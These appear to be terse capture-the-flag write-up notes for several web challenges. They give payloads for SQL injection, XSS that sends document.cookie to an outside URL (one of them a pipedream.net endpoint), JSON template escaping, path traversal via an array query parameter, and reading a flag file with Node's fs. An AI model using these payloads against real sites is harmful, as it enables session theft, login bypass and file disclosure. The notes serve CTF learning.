# web

## inspector-general

```
inspect element and you'll get flag
```

## login

```
sqli with payload ' or 1=1 --
```

## static-pastebin

```
ssrf to steal admin cookie
payload:
/><img src=x onerror="document.location.href=YOUR_CONTROLED_URL?v=" + document.cookie">
```

## panda-facts

```
escaping out of js template string
payload:
}","member":1,"a":"{
```

## static-static-hosting

```
ssrf to steal admin cookie
allowed attributes ['src', 'width', 'height', 'alt', 'class']
payload:
<iframe src="javascript:document.location.href='https://enx85hkonbfps.x.pipedream.net?v=' + document.cookie">
```

## tux-fanpage

References:

[express query doc](https://expressjs.com/en/api.html#req.query)
[node path resolve doc](https://nodejs.org/api/path.html#path_path_resolve_paths)

```
%22%20%2B%20flag%20%2B%20%22    => Doesn't work
abc\.\.\.\.\\index.js    => gives 'abc..index.js'

Solution Idea:
a. express query can be array
b. node path can be array too

payload:
?path[]=i&path[]=/../../index.js
```

## XXXX

```
require('fs').readFileSync('/ctf/flag.txt')
```
